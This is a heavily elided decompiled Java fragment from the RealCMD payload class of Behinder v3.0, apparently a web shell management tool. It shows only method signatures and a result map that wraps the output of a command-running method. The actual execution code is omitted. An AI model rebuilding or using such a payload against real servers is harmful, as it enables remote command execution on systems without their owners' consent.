...
public class RealCMD
    ...
    public boolean equals1(HttpServletRequest request, HttpServletResponse response) {
        ...
        try {
            result.put("msg", runCmd1(request, response));
            result.put("status", "success");
        } catch (Exception e) {
    ...
    public String runCmd1(HttpServletRequest request, HttpServletResponse response) throws Exception {
...
/* Location:              /Users/kongzhen/kz_s3c/Behinder_v3.0_Beta_6_mac/Behinder_v3.0_Beta6_mac.jar!/net/rebeyond/behinder/payload/java/RealCMD.class
